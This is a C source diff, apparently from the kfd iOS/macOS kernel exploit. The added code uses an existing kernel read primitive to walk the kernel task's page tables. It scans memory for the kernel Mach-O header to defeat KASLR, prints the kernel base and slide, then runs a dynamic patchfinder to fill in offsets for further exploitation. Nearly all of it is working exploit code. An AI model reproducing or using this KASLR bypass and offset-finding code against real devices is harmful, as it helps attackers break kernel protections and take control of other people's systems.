@@ -101,6 +101,64 @@ void kread_sem_open_find_proc(struct kfd* kfd)
     u64 pseminfo_kaddr = pnode->pinfo;
     u64 semaphore_kaddr = static_kget(struct pseminfo, psem_semobject, pseminfo_kaddr);
     u64 task_kaddr = static_kget(struct semaphore, owner, semaphore_kaddr);
+    
+
+    bool EXPERIMENTAL_DYNAMIC_PATCHFINDER = true;
+    if(import_kfd_offsets() == -1 && EXPERIMENTAL_DYNAMIC_PATCHFINDER) {
+        //Step 1. break kaslr
+        printf("kernel_task: 0x%llx\n", task_kaddr);
+        
+        uint64_t kerntask_vm_map = 0;
+        kread((u64)kfd, task_kaddr + 0x28, &kerntask_vm_map, sizeof(kerntask_vm_map));
+        kerntask_vm_map = UNSIGN_PTR(kerntask_vm_map);
+        printf("kernel_task->vm_map: 0x%llx\n", kerntask_vm_map);
+        
+        uint64_t kerntask_pmap = 0;
+        kread((u64)kfd, kerntask_vm_map + 0x40, &kerntask_pmap, sizeof(kerntask_pmap));
+        kerntask_pmap = UNSIGN_PTR(kerntask_pmap);
+        printf("kernel_task->vm_map->pmap: 0x%llx\n", kerntask_pmap);
+        
+        /* Pointer to the root translation table. */ /* translation table entry */
+        uint64_t kerntask_tte = 0;
+        kread((u64)kfd, kerntask_pmap, &kerntask_tte, sizeof(kerntask_tte));
+        kerntask_tte = UNSIGN_PTR(kerntask_tte);
+        printf("kernel_task->vm_map->pmap->tte: 0x%llx\n", kerntask_tte);
+        
+        uint64_t kerntask_tte_page = kerntask_tte & ~(0xfff);
+        printf("kerntask_tte_page: 0x%llx\n", kerntask_tte_page);
+        
+        uint64_t kbase = 0;
+        while (true) {
+            uint64_t val = 0;
+            kread((u64)kfd, kerntask_tte_page, &val, sizeof(val));
+            if(val == 0x100000cfeedfacf) {
+                kread((u64)kfd, kerntask_tte_page + 0x18, &val, sizeof(val)); 
+                //arm64e: check if mach_header_64->flags, mach_header_64->reserved are all 0
+                //arm64: check if mach_header_64->flags == 0x200001 and mach_header_64->reserved == 0;  0x200001
+                if(val == 0 || val == 0x200001) {
+                    kbase = kerntask_tte_page;
+                    break;
+                }
+            }
+            kerntask_tte_page -= 0x1000;
+        }
+        uint64_t vm_kernel_link_addr = get_vm_kernel_link_addr();
+        printf("defeated kaslr, kbase: 0x%llx, kslide: 0x%llx\n", kbase, kbase - vm_kernel_link_addr);
+        
+        //Step 2. run dynamic patchfinder
+        do_dynamic_patchfinder((u64)kfd, kbase);
+    }
+    
+    //Step 3. set offsets from patchfinder or import_kfd_offsets().
+    kern_versions[kfd->info.env.vid].kernelcache__cdevsw = off_cdevsw;
+    kern_versions[kfd->info.env.vid].kernelcache__gPhysBase = off_gPhysBase;
+    kern_versions[kfd->info.env.vid].kernelcache__gPhysSize = off_gPhysSize;
+    kern_versions[kfd->info.env.vid].kernelcache__gVirtBase = off_gVirtBase;
+    kern_versions[kfd->info.env.vid].kernelcache__perfmon_dev_open = off_perfmon_dev_open;
+    kern_versions[kfd->info.env.vid].kernelcache__perfmon_devices = off_perfmon_devices;
+    kern_versions[kfd->info.env.vid].kernelcache__ptov_table = off_ptov_table;
+    kern_versions[kfd->info.env.vid].kernelcache__vn_kqfilter = off_vn_kqfilter;
+    kern_versions[kfd->info.env.vid].proc__object_size = off_proc_object_size;
         
     u64 proc_kaddr = task_kaddr - dynamic_info(proc__object_size);
     kfd->info.kaddr.kernel_proc = proc_kaddr;
